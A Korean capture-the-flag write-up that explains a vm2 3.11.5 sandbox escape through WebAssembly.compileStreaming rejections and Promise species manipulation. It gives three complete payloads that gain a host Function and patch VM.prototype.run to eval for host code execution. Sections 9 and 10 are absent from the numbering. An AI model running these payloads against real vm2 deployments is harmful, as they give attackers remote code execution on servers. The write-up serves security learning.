# [대구 경북 사이버공격 방어대회 2026] Jelly Box 문제풀이

  ## 0. 개요

  문제 이름 : Jelly Box
  문제 유형 : Web / Node.js Sandbox Escape

  이 문제는 일반적인 XSS, SQLi, 파일 업로드 문제가 아니라,
  vm2 sandbox 내부에서 실행되는 JavaScript 코드가 비동기 Promise 처리 과정에서 host
  realm 객체를 얻는 문제다.

  핵심은 다음과 같다.

  WebAssembly.compileStreaming()
  → Promise rejection 발생
  → Promise species 조작
  → host realm Error 객체 획득
  → host Function 획득
  → vm2 실행 경로 패치
  → /flag.txt read

  서버는 사용자가 제출한 JavaScript 코드를 vm2 안에서 실행한다.

  하지만 WebAssembly.compileStreaming의 비동기 rejection과 Promise[Symbol.species] 처리
  과정에서
  sandbox 바깥의 host 객체가 callback으로 넘어오고, 이를 통해 sandbox escape가 가능하
  다.

  최종적으로는:

  host Function 획득
  전역 require 준비
  VM.prototype.run을 eval로 패치
  다음 요청부터 host context에서 코드 실행
  /flag.txt 읽기

  까지 이어지는 exploit chain을 구성할 수 있다.

  ———

  ## 1. 프로그램 구조

  문제 서버는 Express 기반 Node.js 애플리케이션이다.

  주요 기능은 /run 하나다.

  app.post('/run', (req, res) => {
      const code = (req.body && typeof req.body.code === 'string') ? req.body.code : ''

      if (!code) {
          return res.status(400).json({ ok: false, error: 'missing code' })
      }

      if (code.length > 235) {
          return res.status(413).json({ ok: false, error: 'payload too large' })
      }

      const vm = new VM({
          timeout: 2000
      })

      try {
          const result = vm.run(code)
          let out
          try { out = String(result) } catch { out = '[unserializable]' }
          res.json({ ok: true, result: out })
      } catch (e) {
          res.json({ ok: false, error: String(e && e.stack || e) })
      }
  })

  처음 보면 단순한 JavaScript sandbox 실행기처럼 보인다.

  하지만 중요한 제약이 있다.

  payload length <= 235
  vm2 sandbox 사용
  요청마다 new VM 생성
  결과는 String(result)로 변환
  flag는 /flag.txt에 존재

  즉, 공격자는 235자 이하의 JavaScript만으로 vm2 sandbox를 탈출해야 한다.

  ———

  ## 2. 핵심 취약점

  ### 2-1. 직접적인 constructor escape는 막혀 있음

  가장 먼저 시도할 수 있는 방식은 일반적인 JavaScript sandbox escape다.

  this.constructor.constructor('return process')()

  또는:

  Buffer.constructor.constructor('return process')()
  Buffer.prototype.inspect.constructor.constructor('return process')()

  하지만 모두 실패한다.

  결과는 대부분 다음과 같았다.

  process is not defined
  undefined

  즉, sandbox 내부의 Function constructor만 얻을 수 있고, host의 process에는 접근할 수
  없다.

  ———

  ### 2-2. vm2 패치 상태

  문제에서 사용한 vm2는 3.11.5였다.

  이 버전은 여러 공개 escape를 막고 있었다.

  막혀 있던 대표적인 표면은 다음과 같다.

  Function constructor 직접 탈출
  Error.prepareStackTrace CallSite leak
  Symbol.for('nodejs.util.inspect.custom')
  WebAssembly.JSTag
  WebAssembly.promising
  WebAssembly.Suspending
  Promise species 기존 PoC
  VM2_INTERNAL_STATE_DO_NOT_USE_OR_PROGRAM_WILL_FAIL 접근

  따라서 공개 PoC를 그대로 던지는 방식으로는 풀리지 않는다.

  ———

  ## 3. 취약점 트리거

  핵심 트리거는 이것이다.

  WebAssembly.compileStreaming``

  WebAssembly.compileStreaming은 원래 Response 또는 Promise<Response>를 인자로 받아야
  한다.

  하지만 tagged template 형태로 호출하면 잘못된 인자가 들어가고, 내부적으로 비동기
  rejection이 발생한다.

  이 Promise의 constructor와 Symbol.species를 조작하면, 후속 Promise 생성 과정에서 공격
  자가 만든 class가 호출된다.

  ———

  ## 4. Promise species 조작

  Promise는 .then, .catch, .finally 등을 호출할 때 새 Promise를 만들기 위해 species
  constructor를 참조한다.

  대략 다음 흐름이다.

  p.finally()
  → p.constructor 참조
  → constructor[Symbol.species] 참조
  → species constructor 호출

  이를 이용해 fake Promise class를 만든다.

  class F {
      constructor(x) {
          x(
              _ => q && q(),
              e => {
                  // rejection object e를 받음
              }
          )
      }

      then(f) {
          q = f
      }
  }

  그리고 Promise p의 constructor를 F로 보이게 만든다.

  F[Symbol.species] = F;
  p.__defineGetter__('constructor', () => F);
  p.finally();

  이때 rejection callback의 인자 e가 중요하다.

  e.constructor.constructor(...)

  여기서 얻는 Function은 sandbox 내부 Function이 아니라 host realm Function이었다.

  따라서 다음과 같은 host code 실행이 가능하다.

  e.constructor.constructor("M=process.mainModule")()

  ———

  ## 5. 왜 여러 단계로 나누는가

  한 번에 플래그를 읽는 payload를 만들고 싶지만, 서버에는 길이 제한이 있다.

  if (code.length > 235) {
      return res.status(413).json({ ok: false, error: 'payload too large' })
  }

  host Function을 얻었다고 해도 다음을 한 번에 넣기에는 길이가 부족하다.

  process.getBuiltinModule('fs').readFileSync('/flag.txt','utf8')

  그래서 exploit을 여러 요청으로 나누어 진행한다.

  각 요청은 235자 이하여야 하므로, host 전역 상태를 조금씩 준비한다.

  공격 전략은 다음과 같다.

  1단계: process.mainModule을 host 전역 M에 저장
  2단계: require를 bind해서 host 전역 R에 저장
  3단계: vm2의 VM.prototype.run을 eval로 패치
  4단계: 다음 요청부터 host eval로 flag read

  ———

  ## 6. 1단계 - process.mainModule 저장

  첫 번째 payload:

  p=WebAssembly.compileStreaming``;q=0;class F{constructor(x)
  {x(_=>q&&q(),e=>{e.constructor.constructor("M=process.mainModule")()})}then(f){q=f}}
  F[Symbol.species]=F;p.__defineGetter__('constructor',()=>F);p.finally()

  길이:

  214 bytes

  이 payload는 host context에서 다음 코드를 실행한다.

  M = process.mainModule

  이후 host 전역에 M이 남는다.

  ———

  ## 7. 2단계 - require 바인딩 저장

  process.mainModule.require를 그냥 저장하면 this 바인딩이 깨질 수 있다.

  따라서 반드시 bind해서 저장한다.

  두 번째 payload:

  p=WebAssembly.compileStreaming``;q=0;class F{constructor(x)
  {x(_=>q&&q(),e=>{e.constructor.constructor("R=M.require.bind(M)")()})}then(f){q=f}}
  F[Symbol.species]=F;p.__defineGetter__('constructor',()=>F);p.finally()

  길이:

  213 bytes

  host context에서는 다음이 실행된다.

  R = M.require.bind(M)

  이제 짧게 CommonJS module을 불러올 수 있다.

  R('vm2')
  R('fs')

  ———

  ## 8. 3단계 - VM.prototype.run 패치

  서버는 요청마다 새 VM을 만든다.

  const vm = new VM({
      timeout: 2000
  })

  const result = vm.run(code)

  따라서 VM.prototype.run을 바꾸면 이후 모든 요청의 실행 방식이 바뀐다.

  세 번째 payload:

  p=WebAssembly.compileStreaming``;q=0;class F{constructor(x)
  {x(_=>q&&q(),e=>{e.constructor.constructor("R('vm2').VM.prototype.run=eval")()})}
  then(f){q=f}}F[Symbol.species]=F;p.__defineGetter__('constructor',()=>F);p.finally()

  길이:

  224 bytes

  host context에서 실행되는 코드는 다음과 같다.

  R('vm2').VM.prototype.run = eval

  이후 서버의 실행 흐름은 사실상 이렇게 바뀐다.

  const result = eval(code)

  즉, 더 이상 sandbox 내부 실행이 아니다.

  다음 요청부터 /run에 보내는 code는 host context에서 실행된다.

  ———

  ## 11. 전체 공격 흐름 정리

  전체 exploit chain은 다음과 같다.

  WebAssembly.compileStreaming`` 호출
  잘못된 인자로 Promise rejection 발생
  Promise constructor getter 조작
  Symbol.species 조작

  rejection callback에서 host Error 객체 획득
  e.constructor.constructor로 host Function 획득
  host context에 M = process.mainModule 저장
  host context에 R = M.require.bind(M) 저장
  vm2의 VM.prototype.run을 eval로 패치
  다음 요청부터 host eval 실행
  /flag.txt read
  flag 획득

  ## 12. 포인트

  이 문제의 핵심 포인트는 다음이다.

  일반적인 Web 취약점이 아님
  vm2 sandbox escape 문제
  직접 constructor.constructor escape는 막힘
  WebAssembly.compileStreaming의 비동기 rejection 이용
  Promise species 조작
  host realm Error 객체 획득
  payload 길이 제한 235자
  한 번에 exploit 불가
  여러 요청에 걸쳐 host 전역 상태 누적
  VM.prototype.run 패치 후 host eval 전환

  특히 중요한 점은 한 번에 플래그를 읽는 것이 아니라는 것이다.

  235자 제한 때문에 exploit을 다음처럼 쪼갰다.

  process.mainModule 저장
  require 저장
  VM.prototype.run 패치
  flag read

  이 방식으로 길이 제한을 우회했다.

  ———

  ## 13. 정리

  이 문제는 vm2 sandbox 내부에서 실행되는 JavaScript 코드가
  WebAssembly.compileStreaming의 비동기 rejection과 Promise species 처리 과정에서
  host realm Error 객체를 얻을 수 있는 취약점을 이용한다.

  직접적인 sandbox escape는 대부분 막혀 있었지만,
  host Error 객체의 constructor chain을 통해 host Function을 얻을 수 있었다.

  이후 payload 길이 제한 때문에 여러 단계로 나누어 host 전역에 상태를 저장하고,
  최종적으로 vm2.VM.prototype.run을 eval로 패치하여 다음 요청부터 host context에서 코드
  를 실행했다.

  그 결과 /flag.txt를 읽어 플래그를 획득할 수 있었다.
